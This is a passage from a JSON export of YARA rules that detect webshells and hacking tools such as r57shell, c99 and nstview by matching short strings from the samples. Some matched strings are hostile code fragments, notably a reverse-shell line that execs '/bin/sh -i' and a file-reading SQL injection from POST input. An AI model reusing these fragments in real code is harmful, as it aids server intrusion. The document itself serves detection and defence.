WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<hr>to browse go to http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=[directory he\" \n      $s6 = \"if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fn\" \n      $s9 = \"// a simple php backdoor\" \n   condition: \n      1 of them\n}","date":"2014-04-07 10:56:51","description":"Webshells Auto-generated - file Simple_PHP_BackDooR.php","minimum_yara":"1.7","name":"Simple_PHP_BackDooR_RID2E06","reference":"-","required_modules":[],"rule_hash":"d6ce909fa562c5987d556ebc0ad1f4bc","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_Mithril_v1_45_Mithril_RID3082 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Mithril.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:42:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"cress.exe\" \n      $s7 = \"\\\\Debug\\\\Mithril.\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:42:51","description":"Webshells Auto-generated - file Mithril.exe","minimum_yara":"1.7","name":"HKTL_Mithril_v1_45_Mithril_RID3082","reference":"-","required_modules":[],"rule_hash":"54122329edaa79eb20a0d48ed025527b","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_hkshell_hkrmv_RID2E15 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file hkrmv.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:59:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"/THUMBPOSITION7\" \n      $s6 = \"\\\\EvilBlade\\\\\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:59:21","description":"Webshells Auto-generated - file hkrmv.exe","minimum_yara":"1.7","name":"HKTL_hkshell_hkrmv_RID2E15","reference":"-","required_modules":[],"rule_hash":"4d1b37249572244f24b6ab20824075a3","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_FeliksPack3___PHP_Shells_phpft_RID3606 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phpft.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 16:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s6 = \"PHP Files Thief\" \n      $s11 = \"http://www.4ngel.net\" \n   condition: \n      all of them\n}","date":"2014-04-07 16:38:11","description":"Webshells Auto-generated - file phpft.php","minimum_yara":"1.7","name":"Webshell_FeliksPack3___PHP_Shells_phpft_RID3606","reference":"-","required_modules":[],"rule_hash":"0d8e40ba444aa04df42f6f08be3afba0","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_indexer_RID2FAE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file indexer.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"<td>Nereye :<td><input type=\\\"text\\\" name=\\\"nereye\\\" size=25></td><td><input type=\\\"r\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:07:31","description":"Webshells Auto-generated - file indexer.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_indexer_RID2FAE","reference":"-","required_modules":[],"rule_hash":"9c9e1135c48ccbaf12e6dfacf020f1d3","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r57shell_RID2D9C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file r57shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:39:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s11 = \" $_POST['cmd']=\\\"echo \\\\\\\"Now script try connect to\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:39:11","description":"Webshells Auto-generated - file r57shell.php","minimum_yara":"1.7","name":"Webshell_r57shell_RID2D9C","reference":"-","required_modules":[],"rule_hash":"a6077a01a9dcaf3a64c8d2ec117af836","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_bdcli100_RID2B32 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file bdcli100.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 08:56:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s5 = \"unable to connect to \" \n      $s8 = \"backdoor is corrupted on \" \n   condition: \n      all of them\n}","date":"2014-04-07 08:56:11","description":"Webshells Auto-generated - file bdcli100.exe","minimum_yara":"1.7","name":"HKTL_bdcli100_RID2B32","reference":"-","required_modules":[],"rule_hash":"ef7bf3c3b893fa9975e2c6ca39a2d05a","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_HYTop_DevPack_2005Red_RID31B8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005Red.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 13:34:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"scrollbar-darkshadow-color:#FF9DBB;\" \n      $s3 = \"echo \\\"&nbsp;<a href=\\\"\\\"/\\\"&encodeForUrl(theHref,false)&\\\"\\\"\\\" target=_blank>\\\"&replace\" \n      $s9 = \"theHref=mid(replace(lcase(list.path),lcase(server.mapPath(\\\"/\\\")),\\\"\\\"),2)\" \n   condition: \n      all of them\n}","date":"2014-04-07 13:34:31","description":"Webshells Auto-generated - file 2005Red.asp","minimum_yara":"1.7","name":"Webshell_HYTop_DevPack_2005Red_RID31B8","reference":"-","required_modules":[],"rule_hash":"d6e22e53c10cd5283fdcb8493769c0dc","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_HYTop2006_rar_Folder_2006X2_RID314F : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2006X2.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 13:17:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Powered By \" \n      $s3 = \" \\\" onClick=\\\"this.form.sharp.name=this.form.password.value;this.form.action=this.\" \n   condition: \n      all of them\n}","date":"2014-04-07 13:17:01","description":"Webshells Auto-generated - file 2006X2.exe","minimum_yara":"1.7","name":"HKTL_HYTop2006_rar_Folder_2006X2_RID314F","reference":"-","required_modules":[],"rule_hash":"0c1ddfe1cad9165623c985954d29bb57","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_rdrbs084_RID2B5C : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file rdrbs084.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 09:03:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Create mapped port. You have to specify domain when using HTTP type.\" \n      $s8 = \"<LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET SERVER> <TARGET\" \n   condition: \n      all of them\n}","date":"2014-04-07 09:03:11","description":"Webshells Auto-generated - file rdrbs084.exe","minimum_yara":"1.7","name":"HKTL_rdrbs084_RID2B5C","reference":"-","required_modules":[],"rule_hash":"3a47ef444392c24690dbb7fd4b072e9e","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_HYTop_CaseSwitch_2005_RID2FEA : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:17:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"MSComDlg.CommonDialog\" \n      $s2 = \"CommonDialog1\" \n      $s3 = \"__vbaExceptHandler\" \n      $s4 = \"EVENT_SINK_Release\" \n      $s5 = \"EVENT_SINK_AddRef\" \n      $s6 = \"By Marcos\" \n      $s7 = \"EVENT_SINK_QueryInterface\" \n      $s8 = \"MethCallEngine\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:17:31","description":"Webshells Auto-generated - file 2005.exe","minimum_yara":"1.7","name":"HKTL_HYTop_CaseSwitch_2005_RID2FEA","reference":"-","required_modules":[],"rule_hash":"8d181359912086a28c87b47fac50757c","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_eBayId_index3_RID2F7E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file index3.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s8 = \"$err = \\\"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\\\\\"You\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:59:31","description":"Webshells Auto-generated - file index3.php","minimum_yara":"1.7","name":"Webshell_eBayId_index3_RID2F7E","reference":"-","required_modules":[],"rule_hash":"04e3891aef9473f5f3a4036bec85ebd4","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_phvayv_RID2F5D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phvayv.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"wrap=\\\"OFF\\\">XXXX</textarea></font><font face\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:54:01","description":"Webshells Auto-generated - file phvayv.php","minimum_yara":"1.7","name":"Webshell_FSO_s_phvayv_RID2F5D","reference":"-","required_modules":[],"rule_hash":"e2014f9a2228338eaba91ff966b79368","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_casus15_2_RID2FD5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file casus15.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:14:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"copy ( $dosya_gonder\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:14:01","description":"Webshells Auto-generated - file casus15.php","minimum_yara":"1.7","name":"Webshell_FSO_s_casus15_2_RID2FD5","reference":"-","required_modules":[],"rule_hash":"df31cdccbfd0546898801cb78b722f0e","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_installer_RID2E74 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file installer.cmd\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:15:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Restore Old Vanquish\" \n      $s4 = \"ReInstall Vanquish\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:15:11","description":"Webshells Auto-generated - file installer.cmd","minimum_yara":"1.7","name":"Webshell_installer_RID2E74","reference":"-","required_modules":[],"rule_hash":"2fa2ad4563d3279b808bc08730d65a98","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_remview_2_RID304F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file remview.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:34:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<xmp>$out</\" \n      $s1 = \".mm(\\\"Eval PHP code\\\").\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:34:21","description":"Webshells Auto-generated - file remview.php","minimum_yara":"1.7","name":"Webshell_FSO_s_remview_2_RID304F","reference":"-","required_modules":[],"rule_hash":"64c9096d84412a83b3acc32275eae257","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FeliksPack3___PHP_Shells_r57_RID34C2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file r57.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 15:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$sql = \\\"LOAD DATA INFILE \\\\\\\"\\\".$_POST['test3_file'].\" \n   condition: \n      all of them\n}","date":"2014-04-07 15:44:11","description":"Webshells Auto-generated - file r57.php","minimum_yara":"1.7","name":"Webshell_FeliksPack3___PHP_Shells_r57_RID34C2","reference":"-","required_modules":[],"rule_hash":"abe763cfd379633d8189158b5a3ff655","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_HYTop2006_rar_Folder_2006X_RID311D : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2006X.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 13:08:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input name=\\\"password\\\" type=\\\"password\\\" id=\\\"password\\\"\" \n      $s6 = \"name=\\\"theAction\\\" type=\\\"text\\\" id=\\\"theAction\\\"\" \n   condition: \n      all of them\n}","date":"2014-04-07 13:08:41","description":"Webshells Auto-generated - file 2006X.exe","minimum_yara":"1.7","name":"HKTL_HYTop2006_rar_Folder_2006X_RID311D","reference":"-","required_modules":[],"rule_hash":"36040b91854ec313820099ba69c2215a","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_phvayv_2_RID2FEE : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file phvayv.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:18:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"rows=\\\"24\\\" cols=\\\"122\\\" wrap=\\\"OFF\\\">XXXX</textarea></font><font\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:18:11","description":"Webshells Auto-generated - file phvayv.php","minimum_yara":"1.7","name":"Webshell_FSO_s_phvayv_2_RID2FEE","reference":"-","required_modules":[],"rule_hash":"3084815b75c5854db8ad3cee9dceba46","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_elmaliseker_RID2F34 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file elmaliseker.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"javascript:Command('Download'\" \n      $s5 = \"zombie_array=array(\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:47:11","description":"Webshells Auto-generated - file elmaliseker.asp","minimum_yara":"1.7","name":"Webshell_elmaliseker_RID2F34","reference":"-","required_modules":[],"rule_hash":"f9d0fc959dfec3f1117b6c84fce24a09","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_RemExp_RID2F10 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file RemExp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:41:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=SubFolder.Name%>\\\"> <a href= \\\"<%=Request.Ser\" \n      $s5 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=File.Name%>\\\"> <a href= \\\"showcode.asp?f=<%=F\" \n      $s6 = \"<td bgcolor=\\\"<%=BgColor%>\\\" align=\\\"right\\\"><%=Attributes(SubFolder.Attributes)%></\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:41:11","description":"Webshells Auto-generated - file RemExp.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_RemExp_RID2F10","reference":"-","required_modules":[],"rule_hash":"3ec8eb48e6c2d769597406326c2e8ac9","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_tool_RID2E7D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file tool.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:16:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"\\\"\\\"%windir%\\\\\\\\calc.exe\\\"\\\")\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:16:41","description":"Webshells Auto-generated - file tool.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_tool_RID2E7D","reference":"-","required_modules":[],"rule_hash":"80ca29a5ff9e9ff0a61870a70c4dfd54","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FeliksPack3___PHP_Shells_2005_RID34AB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file 2005.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 15:40:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"window.open(\\\"\\\"&url&\\\"?id=edit&path=\\\"+sfile+\\\"&op=copy&attrib=\\\"+attrib+\\\"&dpath=\\\"+lp\" \n      $s3 = \"<input name=\\\"dbname\\\" type=\\\"hidden\\\" id=\\\"dbname\\\" value=\\\"<%=request(\\\"dbname\\\")%>\\\">\" \n   condition: \n      all of them\n}","date":"2014-04-07 15:40:21","description":"Webshells Auto-generated - file 2005.asp","minimum_yara":"1.7","name":"Webshell_FeliksPack3___PHP_Shells_2005_RID34AB","reference":"-","required_modules":[],"rule_hash":"b4cadcb3fc713e4ec393a4a72d6eb69c","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_shelltools_g0t_root_Fport_RID32E3 : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Fport.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:24:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"Copyright 2000 by Foundstone, Inc.\" \n      $s5 = \"You must have administrator privileges to run fport - exiting...\" \n   condition: \n      all of them\n}","date":"2014-04-07 14:24:21","description":"Webshells Auto-generated - file Fport.exe","minimum_yara":"1.7","name":"HKTL_shelltools_g0t_root_Fport_RID32E3","reference":"-","required_modules":[],"rule_hash":"0964cabd2682e343c353308669db3bbd","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_BackDooR__fr__RID2F80 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file BackDooR (fr).php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:59:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"print(\\\"<p align=\\\\\\\"center\\\\\\\"><font size=\\\\\\\"5\\\\\\\">Exploit include \" \n   condition: \n      all of them\n}","date":"2014-04-07 11:59:51","description":"Webshells Auto-generated - file BackDooR (fr).php","minimum_yara":"1.7","name":"Webshell_BackDooR__fr__RID2F80","reference":"-","required_modules":[],"rule_hash":"d58fa9e597031b1609f3bd02d8f59009","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_ntdaddy_RID2FA7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file ntdaddy.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:06:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input type=\\\"text\\\" name=\\\".CMD\\\" size=\\\"45\\\" value=\\\"<%= szCMD %>\\\"> <input type=\\\"s\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:06:21","description":"Webshells Auto-generated - file ntdaddy.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_ntdaddy_RID2FA7","reference":"-","required_modules":[],"rule_hash":"05e6f7d444cec90a24eccec2b7b7efcc","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_stview_nstview_RID30B7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file nstview.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"open STDIN,\\\\\\\"<&X\\\\\\\";open STDOUT,\\\\\\\">&X\\\\\\\";open STDERR,\\\\\\\">&X\\\\\\\";exec(\\\\\\\"/bin/sh -i\\\\\\\");\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:51:41","description":"Webshells Auto-generated - file nstview.php","minimum_yara":"1.7","name":"Webshell_stview_nstview_RID30B7","reference":"-","required_modules":[],"rule_hash":"4ca227ff2e6d2196b995fbb7db25afd6","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_HYTop_DevPack_upload_RID325B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file upload.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 14:01:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<!-- PageUpload Below -->\" \n   condition: \n      all of them\n}","date":"2014-04-07 14:01:41","description":"Webshells Auto-generated - file upload.asp","minimum_yara":"1.7","name":"Webshell_HYTop_DevPack_upload_RID325B","reference":"-","required_modules":[],"rule_hash":"16da3d9a93bb30a6fac46f236a188dd4","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule HKTL_PasswordReminder_RID2F2C : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file PasswordReminder.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 11:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"The encoded password is found at 0x%8.8lx and has a length of %d.\" \n   condition: \n      all of them\n}","date":"2014-04-07 11:45:51","description":"Webshells Auto-generated - file PasswordReminder.exe","minimum_yara":"1.7","name":"HKTL_PasswordReminder_RID2F2C","reference":"-","required_modules":[],"rule_hash":"6bed9e9c6403073300b020a64a29fca7","score":75,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_RemExp_2_RID2FA1 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file RemExp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 12:05:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \" Then Response.Write \\\"\" \n      $s3 = \"<a href= \\\"<%=Request.ServerVariables(\\\"script_name\\\")%>\" \n   condition: \n      all of them\n}","date":"2014-04-07 12:05:21","description":"Webshells Auto-generated - file RemExp.asp","minimum_yara":"1.7","name":"Webshell_FSO_s_RemExp_2_RID2FA1","reference":"-","required_modules":[],"rule_hash":"76dee5e4423345c7d71d0d61285077e7","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_FSO_s_c99_RID2D94 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file c99.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:37:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"\\\"txt\\\",\\\"conf\\\",\\\"bat\\\",\\\"sh\\\",\\\"js\\\",\\\"bak\\\",\\\"doc\\\",\\\"log\\\",\\\"sfc\\\",\\\"cfg\\\",\\\"htacce\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:37:51","description":"Webshells Auto-generated - file 